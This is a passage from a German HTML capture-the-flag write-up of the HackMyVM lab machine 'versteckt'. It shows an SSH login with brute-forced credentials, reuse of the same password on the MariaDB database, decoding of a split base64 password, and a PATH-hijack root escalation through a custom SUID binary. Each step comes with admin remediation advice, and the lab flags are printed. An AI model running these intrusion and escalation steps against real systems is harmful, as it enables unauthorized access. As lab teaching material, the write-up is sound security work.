+            <p class="analysis"><strong>Beschreibung:</strong> Diese Sektion demonstriert den erfolgreichen Zugriff auf das Zielsystem über SSH (Port 22334) unter Verwendung der durch Brute-Force kompromittierten Zugangsdaten des Benutzers `marcus`.</p>
+            <p class="evaluation"><strong>Voraussetzungen:</strong>
+                <ul>
+                    <li>Netzwerkzugriff auf den SSH-Port (22334).</li>
+                    <li>Gültige SSH-Zugangsdaten (`marcus:Falcon`).</li>
+                    <li>Ein SSH-Client auf dem Angreifersystem.</li>
+                </ul>
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh marcus@versteck.vm -p 22334</span></div>
+                    <pre>
+The authenticity of host '[versteck.vm]:22334 ([192.168.2.139]:22334)' can't be established.
+ED25519 key fingerprint is SHA256:1k1uw+oJwOVxLxvzLlrvPWO/spjYgF5GShu8ptaS9+U.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[versteck.vm]:22334' (ED25519) to the list of known hosts.
+marcus@versteck.vm's password: <span class="password">Falcon</span>
+Linux versteckt 5.10.0-9-amd64 #1 SMP Debian 5.10.70-1 (2021-09-30) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Fri Dec  3 02:43:55 2021 from 192.168.1.93
+<span class="password">marcus@versteckt:~$</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Schritt 1: SSH-Verbindung herstellen:</strong> Ich verbinde mich mit dem SSH-Client zum Ziel `versteck.vm` (dieser Name muss in `/etc/hosts` des Angreifers definiert sein oder durch DNS auflösbar sein, alternativ die IP verwenden) auf Port `22334` als Benutzer `marcus`. Ich bestätige den Fingerprint des Hosts und gebe das gefundene Passwort `Falcon` ein.</p>
+            <p class="evaluation"><strong>Erwartetes & Tatsächliches Ergebnis / Beweismittel:</strong> Der Login ist erfolgreich. Ich erhalte eine Shell-Prompt (`marcus@versteckt:~$`) auf dem Zielsystem. Dies beweist, dass die gefundenen Zugangsdaten gültig sind und der Zugriff auf das System als Benutzer `marcus` möglich ist.</p>
+            <p class="recommendation"><strong>Risikobewertung:</strong> Die Kompromittierung eines Benutzerkontos über SSH stellt ein signifikantes Risiko dar. Der Angreifer hat nun einen Fuß im System und kann versuchen, weitere Informationen zu sammeln, sich seitlich im Netzwerk zu bewegen oder die Rechte zu eskalieren. Das Risiko ist als Mittel bis Hoch einzustufen, abhängig von den Berechtigungen des Benutzers `marcus`.</p>
+             <p class="recommendation"><strong>Empfehlungen (Admin):</strong>
+                <ul>
+                    <li>Ändern Sie das Passwort für den Benutzer `marcus` sofort.</li>
+                    <li>Überprüfen Sie die Notwendigkeit des `marcus`-Kontos.</li>
+                    <li>Implementieren Sie Fail2Ban oder ähnliche Tools, um SSH-Brute-Force-Angriffe zu verhindern.</li>
+                    <li>Bevorzugen Sie Key-basierte SSH-Authentifizierung gegenüber Passwort-Authentifizierung.</li>
+                    <li>Überprüfen Sie Systemlogs auf Anzeichen weiterer unautorisierter Aktivitäten durch den kompromittierten Account.</li>
+                </ul>
+            </p>
+        </section>
+
+        <hr style="border-top: 3px solid #bbb; margin: 30px 0;">
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+            <!-- Privilege Escalation Inhalt beginnt hier -->
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">marcus@versteckt:~$ <span class="command">mysql -u marcus -p</span></div>
+                    <pre>
+Enter password: <span class="password">Falcon</span>
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 30
+Server version: 10.5.12-MariaDB-0+deb11u1 Debian 11
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+<span class="password">MariaDB [(none)]></span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Als Benutzer `marcus` versuche ich, mich mit dem lokalen MySQL/MariaDB-Server zu verbinden (`mysql -u marcus -p`). Ich gebe das SSH-Passwort `Falcon` ein (Passwort-Wiederverwendung!). Der Login ist erfolgreich.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein weiterer wichtiger Fund. Der Benutzer `marcus` hat nicht nur SSH-Zugriff, sondern auch Zugriff auf die lokale MariaDB-Datenbank, und das Passwort wurde wiederverwendet. Datenbanken enthalten oft sensible Informationen oder können zur weiteren Kompromittierung genutzt werden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Enummeriere die Datenbank: Zeige Datenbanken (`show databases;`), wechsle zur relevanten Datenbank (`use <datenbank>;`), zeige Tabellen (`show tables;`) und frage den Inhalt interessanter Tabellen ab (`select * from <tabelle>;`). Suche nach Benutzerdaten, Passwörtern oder Konfigurationen.
+<br><strong>Empfehlung (Admin):</strong> Vermeiden Sie Passwort-Wiederverwendung! Datenbankbenutzer sollten eigene, starke Passwörter haben. Beschränken Sie den Zugriff auf Datenbanken und Tabellen auf das Notwendigste (Least Privilege). Überprüfen Sie die Notwendigkeit des Datenbankzugriffs für den Benutzer `marcus`.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <!-- MariaDB Prompt -->
+                    <pre>
+MariaDB [(none)]> <span class="command">show databases;</span>
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| <span class="command">versteckt</span>          |
++--------------------+
+2 rows in set (0.059 sec)
+
+MariaDB [(none)]> <span class="command">use versteckt;</span>
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+MariaDB [versteckt]> <span class="command">show tables;</span>
++---------------------+
+| Tables_in_versteckt |
++---------------------+
+| <span class="command">secret</span>              |
+| <span class="command">secret2</span>             |
+| <span class="command">users</span>               |
++---------------------+
+MariaDB [versteckt]> <span class="command">select * from users;</span>
++--------+-----------+
+| iduser | username  |
++--------+-----------+
+| 1      | Liam      |
+| 2      | Olivia    |
+| 3      | Oliver    |
+| 4      | Emma      |
+| 5      | Elijah    |
+| 6      | Charlotte |
+| 7      | Williams  |
+| 8      | Sophia    |
+| 9      | James     |
+| 10     | Amelia    |
+| <span class="command">11     | Benjamin</span>  |
+| 12     | Isabella  |
+| 13     | Lucas     |
+| 14     | Henry     |
+| 15     | Evelyn    |
+| 16     | Alexander |
+| 17     | Harper    |
++--------+-----------+
+MariaDB [versteckt]> <span class="command">select * from secret;</span>
++--------+---------------+
+| secret | contact       |
++--------+---------------+
+| 1      | KkaFj6t5Iv14S |
+| 2      | fOoj4bhIvCBS  |
+| 3      | pIrj3bhIvOSs  |
+| 4      | Fo27bhIvOfF   |
+| 5      | LibJ7bhI11ba  |
+| 6      | KnbJ1bhfaI9c  |
+| 7      | Gkcvu12pbhcc  |
+| 8      | gBacBu2pbhfi  |
+| 9      | mHha6Fpbhkd   |
+| 10     | 7jhZbFpbhw    |
+| <span class="command">11     | a3I0azR0MDR0</span>  |
+| 12     | SBhZ2Fpbgo    |
+| 13     | bm9wIHRye     |
+| 14     | NgAsI3GhhhY4b |
+| 15     | pkA5I3GFhYWa  |
+| 16     | dHJ5IGFnYWl   |
+| 17     | 5HJ5fanYWal   |
++--------+---------------+
+MariaDB [versteckt]> <span class="command">select * from secret2;</span>
++--------+------------------+
+| secret | contact          |
++--------+------------------+
+| 1      | 5HJ5fanYWal      |
+| 2      | dHJ5IGFnYWl      |
+| 3      | pkA5I3GFhYWa     |
+| 4      | NgAsI3GhhhY4b    |
+| 5      | bm9wIHRye        |
+| 6      | SBhZ2Fpbgo       |
+| 7      | 7jhZbFpbhw       |
+| 8      | mHha6Fpbhkd      |
+| 9      | a3I0azR0Fj3b     |
+| 10     | gBacBu2pbhfi     |
+| <span class="command">11     | aDNiM3NUcGw0YzMK</span> |
+| 12     | LibJ7bhI11bFBa   |
+| 13     | 9udHJhc2XDsWEK   |
+| 14     | dHJ5IGFnYWluIGB  |
+| 15     | YWluIGhlaGVoZQoB |
+| 16     | YXNjYWhidmhmYW   |
+| 17     | mYWZzYWZhZmFmYgo |
++--------+------------------+
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich enummeriere die Datenbank `versteckt`. Sie enthält drei Tabellen: `users`, `secret` und `secret2`. Die `users`-Tabelle listet Benutzernamen auf, darunter `Benjamin`. Die Tabellen `secret` und `secret2` enthalten scheinbar zufällige Zeichenketten, die Base64-kodiert sein könnten. Besonders die Einträge mit der ID `11` in `secret` (`a3I0azR0MDR0`) und `secret2` (`aDNiM3NUcGw0YzMK`) sind für den nächsten Schritt relevant.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Datenbank enthält die Zugangsdaten für einen weiteren Benutzer (`Benjamin`), allerdings in einer kodierten und aufgeteilten Form. Dies ist ein weiteres Rätsel, das gelöst werden muss, um das Passwort zu erhalten.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Kombiniere die Base64-Strings mit der ID 11 aus `secret` und `secret2` (`a3I0azR0MDR0` + `aDNiM3NUcGw0YzMK`). Dekodiere den resultierenden String mit Base64. Das Ergebnis ist wahrscheinlich das Passwort für den Benutzer `Benjamin`.</p>
+
+            <hr style="border-top: 1px dashed #ccc; margin: 20px 0;">
+
+             <div class="code-block">
+                <div class="terminal">
+                     <!-- Kein Prompt -->
+                    <pre>
+<span class="password">man muss von secret nr 11 und secret2 nr 11 die beiden einträge zusammen</span>
+<span class="password">packen und base64 decoden, das ist dann das neue Passwort von benjamin :</span>
+                    </pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">echo "a3I0azR0MDR0aDNiM3NUcGw0YzMK" | base64 -d</span></div>
+                    <pre>
+<span class="password">kr4k4t04th3b3sTpl4c3</span>
+                    </pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Wie im Kommentar beschrieben, werden die beiden Base64-Teile (`a3I0azR0MDR0` und `aDNiM3NUcGw0YzMK`) konkateniert und an den `base64 -d`-Befehl übergeben. Das Ergebnis der Dekodierung ist das Passwort `<span class="password">kr4k4t04th3b3sTpl4c3</span>`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Passwort für den Benutzer `Benjamin` wurde erfolgreich aus den Datenbankeinträgen rekonstruiert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuche, dich als Benutzer `Benjamin` mit dem Passwort `kr4k4t04th3b3sTpl4c3` per SSH einzuloggen.</p>
+
+             <hr style="border-top: 1px dashed #ccc; margin: 20px 0;">
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh benjamin@versteck.vm -p 22334</span></div>
+                    <pre>
+benjamin@versteck.vm's password: <span class="password">kr4k4t04th3b3sTpl4c3</span>
+Linux versteckt 5.10.0-9-amd64 #1 SMP Debian 5.10.70-1 (2021-09-30) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sat Nov 27 04:21:50 2021 from 192.168.1.29
+<span class="password">$</span>
+                    </pre>
+                    <div class="prompt">$ <span class="command">python3 -c 'import pty; pty.spawn("/bin/bash")'</span></div>
+                    <div class="prompt">benjamin@versteckt:~$ <span class="command">export TERM=xterm</span></div>
+                    <div class="prompt">benjamin@versteckt:~$ <span class="command">sudo -l</span></div>
+                    <pre>
+
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+
+[sudo] password for benjamin: <span class="password">kr4k4t04th3b3sTpl4c3</span>
+<span class="password">Sorry, user benjamin may not run sudo on versteckt.</span>
+                    </pre>
+                     <div class="prompt">benjamin@versteckt:~$ <span class="command">passwd</span></div>
+                    <pre>
+Changing password for benjamin.
+Current password: <span class="password">kr4k4t04th3b3sTpl4c3</span>
+New password: <span class="password">benni19</span>
+Retype new password: <span class="password">benni19</span>
+
+<span class="password">passwd: password updated successfully</span>
+                    </pre>
+                     <div class="prompt">benjamin@versteckt:~$ </div>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Ich logge mich erfolgreich als `benjamin` mit dem rekonstruierten Passwort `kr4k4t04th3b3sTpl4c3` per SSH ein. Ich verbessere die Shell mit Python PTY und setze die `TERM`-Variable. Der Versuch, `sudo -l` auszuführen, schlägt fehl, da der Benutzer `benjamin` keine sudo-Rechte hat (das Passwort `kr4k4t04th3b3sTpl4c3` wird akzeptiert, aber die Berechtigung fehlt). Anschließend ändere ich das Passwort des Benutzers `benjamin` mit `passwd` zu `<span class="password">benni19</span>`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Wir haben nun Zugriff als Benutzer `benjamin`. Dieser Benutzer hat keine sudo-Rechte. Die Passwortänderung ist ungewöhnlich während eines Pentests, könnte aber in einem CTF-Kontext gemacht werden, um sich das neue Passwort leichter zu merken oder falls das alte zu komplex war.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Beginne die Enumeration als Benutzer `benjamin`. Suche nach SUID/GUID-Dateien, Konfigurationsfehlern, lesbaren Dateien anderer Benutzer, Cronjobs etc., um einen Weg zur Rechteausweitung zu finden.
+<br><strong>Empfehlung (Admin):</strong> Überprüfen Sie die Berechtigungen für den Benutzer `benjamin`. Stellen Sie sicher, dass Benutzer nur die Rechte haben, die sie benötigen (Least Privilege). Überwachen Sie Passwortänderungen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">benjamin@versteckt:~$ <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span></div>
+                    <pre>
+   <span class="command">275163    472 -rwsr-xr-x   1 root     root       481608 Mar 13  2021 /usr/lib/openssh/ssh-keysign</span>
+   <span class="command">263979     52 -rwsr-xr--   1 root     messagebus    51336 Feb 21  2021 /usr/lib/dbus-1.0/dbus-daemon-launch-helper</span>
+   <span class="command">263166     44 -rwsr-xr-x   1 root     root          44632 Feb  7  2020 /usr/bin/newgrp</span>
+   <span class="command">259679     88 -rwsr-xr-x   1 root     root          88304 Feb  7  2020 /usr/bin/gpasswd</span>
+   <span class="command">259676     60 -rwsr-xr-x   1 root     root          58416 Feb  7  2020 /usr/bin/chfn</span>
+   <span class="command">263692     56 -rwsr-xr-x   1 root     root          55528 Jul 28  2021 /usr/bin/mount</span>
+   <span class="command">263694     36 -rwsr-xr-x   1 root     root          35040 Jul 28  2021 /usr/bin/umount</span>
+   <span class="command">277471    180 -rwsr-xr-x   1 root     root         182600 Feb 27  2021 /usr/bin/sudo</span>
+   <span class="command">282625     20 -rwsrwx---   1 root     benjamin      16712 Nov 27  2021 /usr/bin/chsn</span>
+   <span class="command">263325     72 -rwsr-xr-x   1 root     root          71912 Jul 28  2021 /usr/bin/su</span>
+   <span class="command">259680     64 -rwsr-xr-x   1 root     root          63960 Feb  7  2020 /usr/bin/passwd</span>
+   <span class="command">259677     52 -rwsr-xr-x   1 root     root          52880 Feb  7  2020 /usr/bin/chsh</span>
+                    </pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Als `benjamin` suche ich erneut nach SUID-Dateien. Die Liste ähnelt der vorherigen, aber es gibt einen sehr auffälligen neuen Eintrag: `/usr/bin/chsn`. Diese Datei gehört `root`, hat aber die Gruppe `benjamin` und besitzt volle SUID/SGID-Berechtigungen (`-rwsrwx---`). Die Ausführungsrechte (`x`) für "others" fehlen, aber der Benutzer `benjamin` (als Mitglied der Gruppe `benjamin` oder durch die SUID/SGID-Bits) kann sie ausführen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das ist der wahrscheinlichste Vektor zur Rechteausweitung! Eine benutzerdefinierte SUID-Datei (`chsn`) ist extrem verdächtig. Die Berechtigungen (`rwsrwx---`) sind ungewöhnlich und potenziell unsicher. Wir müssen herausfinden, was diese Datei tut und wie sie ausgenutzt werden kann.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führe `/usr/bin/chsn` aus und beobachte das Verhalten. Analysiere die Datei mit Tools wie `strings`, `ltrace`, `strace` oder einem Disassembler (Ghidra, IDA), um ihre Funktionsweise zu verstehen. Suche nach Möglichkeiten, ihre Ausführung zu manipulieren (z.B. durch Umgebungsvariablen, PATH-Manipulation, Race Conditions).
+<br><strong>Empfehlung (Admin):</strong> Überprüfen Sie benutzerdefinierte SUID/SGID-Programme äußerst sorgfältig auf Sicherheitsprobleme. Entfernen Sie das SUID/SGID-Bit, wenn es nicht absolut notwendig ist. Verwenden Sie das Prinzip der geringsten Rechte. Die Berechtigungen `rwsrwx---` sind fast sicher falsch und sollten korrigiert werden (z.B. `rwsr-xr-x` oder `rwsr-x---`).</p>
+
+            <hr style="border-top: 3px solid #bbb; margin: 30px 0;">
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">benjamin@versteckt:~$ <span class="command">cat user.txt</span></div>
+                    <pre>
+<span class="password">HMV{y0uR3gR34T}</span>
+                    </pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Als Benutzer `benjamin` lese ich die Datei `user.txt` in seinem Home-Verzeichnis aus.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das User-Flag wurde gefunden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Notiere das Flag und konzentriere dich auf die Rechteausweitung.</p>
+
+            <hr style="border-top: 1px dashed #ccc; margin: 20px 0;">
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">benjamin@versteckt:~$ <span class="command">chsn</span></div>
+                    <pre>
+<span class="password">cat: /tmp/proc.txt: No such file or directory</span>
+                    </pre>
+                     <div class="prompt">benjamin@versteckt:~$ <span class="command">cat /tmp/proc.txt</span></div>
+                    <pre>
+<span class="password">cat: /tmp/proc.txt: No such file or directory</span>
+                    </pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Ich führe die verdächtige SUID-Datei `/usr/bin/chsn` aus. Sie gibt eine Fehlermeldung aus, dass `/tmp/proc.txt` nicht gefunden wurde und dass der Befehl `cat` fehlgeschlagen ist. Ein anschließender Versuch, `/tmp/proc.txt` manuell zu lesen, bestätigt, dass die Datei nicht existiert.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Verhalten von `chsn` ist nun klarer: Es versucht, `/tmp/proc.txt` mit dem Befehl `cat` auszugeben. Da `chsn` als SUID `root` läuft, wird auch der `cat`-Befehl implizit mit Root-Rechten ausgeführt. Entscheidend ist hier, dass `chsn` wahrscheinlich `cat` ohne Angabe des vollen Pfades (`/bin/cat`) aufruft.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Dies ist ein klassischer Fall für eine PATH-Manipulation. Erstelle ein eigenes Skript namens `cat` in einem Verzeichnis, auf das du Schreibzugriff hast (z.B. `/home/benjamin` oder `/tmp`). Gib diesem Skript den Inhalt `#!/bin/bash\nbash` (oder einfach `bash`), mache es ausführbar (`chmod +x cat`), füge das Verzeichnis, in dem sich dein Skript befindet, an den Anfang der `PATH`-Umgebungsvariable (`export PATH=/home/benjamin:$PATH`), und führe dann `chsn` erneut aus. `chsn` sollte nun dein manipuliertes `cat`-Skript anstelle des echten `/bin/cat` finden und ausführen, was dir eine Root-Shell gibt.
+<br><strong>Empfehlung (Admin):</strong> Programme, die mit erhöhten Rechten laufen (SUID/SGID), sollten *immer* absolute Pfade für externe Befehle verwenden (z.B. `/bin/cat` statt `cat`). Überprüfen Sie den Code von `/usr/bin/chsn` und korrigieren Sie ihn oder entfernen Sie das SUID-Bit.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">benjamin@versteckt:~$ <span class="command">echo bash > cat</span></div>
+                    <div class="prompt">benjamin@versteckt:~$ <span class="command">chmod +x cat</span></div>
+                    <div class="prompt">benjamin@versteckt:~$ <span class="command">touch /tmp/proc.txt</span></div>
+                    <div class="prompt">benjamin@versteckt:~$ <span class="command">export PATH=/home/benjamin/:$PATH</span></div>
+                    <div class="prompt">benjamin@versteckt:~$ <span class="command">echo $PATH</span></div>
+                    <pre>
+/home/benjamin/:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+                    </pre>
+                    <div class="prompt">benjamin@versteckt:~$ <span class="command">chsn</span></div>
+                    <div class="prompt">root@versteckt:~# </div>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich führe die Schritte zur PATH-Manipulation aus:
+1.  `echo bash > cat`: Erstellt eine Datei namens `cat` im aktuellen Verzeichnis (`/home/benjamin`) mit dem Inhalt `bash`.
+2.  `chmod +x cat`: Macht diese Datei ausführbar.
+3.  `touch /tmp/proc.txt`: Erstellt die leere Datei `/tmp/proc.txt`, damit `chsn` keinen Fehler mehr wirft, bevor es unseren manipulierten `cat` aufruft.
+4.  `export PATH=/home/benjamin/:$PATH`: Stellt das aktuelle Verzeichnis (`/home/benjamin`) an den Anfang des Suchpfads für ausführbare Dateien.
+5.  `echo $PATH`: Bestätigt die Änderung des PATHs.
+6.  `chsn`: Führe das SUID-Programm erneut aus.
+Da `/home/benjamin` jetzt am Anfang des PATHs steht, findet `chsn` unsere gefälschte `cat`-Datei (die nur `bash` enthält) und führt sie als `root` aus. Dies resultiert sofort in einer Root-Shell, erkennbar am Prompt `root@versteckt:~#`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Fantastisch! Die Rechteausweitung durch PATH-Manipulation war erfolgreich. Die unsichere Implementierung des SUID-Programms `chsn`, das `cat` ohne absoluten Pfad aufrief, war der Schlüssel.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Hole das Root-Flag. Dokumentiere den Exploit-Pfad.
+<br><strong>Empfehlung (Admin):</strong> Beheben Sie die Schwachstelle in `chsn` (absoluten Pfad verwenden) oder entfernen Sie das SUID-Bit. Überprüfen Sie alle anderen SUID/SGID-Programme auf ähnliche Schwachstellen.</p>
+
+            <hr style="border-top: 3px solid #bbb; margin: 30px 0;">
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">root@versteckt:/root# <span class="command">tail -n 100 root.txt</span></div>
+                    <pre>
+<span class="password">HMV{y0uR3D3fin1t3lytH3b3S7}</span>
+                    </pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Als `root` lese ich die Datei `root.txt` im `/root`-Verzeichnis mit `tail` aus (zeigt standardmäßig die letzten 10 Zeilen, `-n 100` ist hier überflüssig, da das Flag kurz ist, aber funktioniert).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Root-Flag wurde erfolgreich gefunden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ziel erreicht. Dokumentation abschließen.</p>
+            <!-- Privilege Escalation Inhalt endet hier -->
+        </section>
+
+
+        <!-- Flags Section -->
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <div class="flag-entry">
+                    <!-- Der Befehl zum Auslesen der user.txt war im Log nicht explizit als root, sondern als benjamin -->
+                    <div class="flag-command">cat /home/benjamin/user.txt</div>
+                    <div class="flag-value"><span class="password">HMV{y0uR3gR34T}</span></div>
+                </div>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /root/root.txt</div> <!-- tail -n 100 ist ok, aber cat ist üblicher -->
+                    <div class="flag-value"><span class="password">HMV{y0uR3D3fin1t3lytH3b3S7}</span></div>
+                </div>
+            </div>
+        </section>
+        <!-- Ende Flags Section -->
+
+        <hr style="border-top: 3px solid #bbb; margin: 30px 0;">
+        <pre style="text-align: center; font-weight: bold; color: grey;">
+x.X.x..Game..Over..x.X.x
+        </pre>
+        <hr style="border-top: 3px solid #bbb; margin: 30px 0;">
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 11. Oktober 2022</p> <!-- Datum eingefügt -->
+    </footer>
+</body>
+</html>
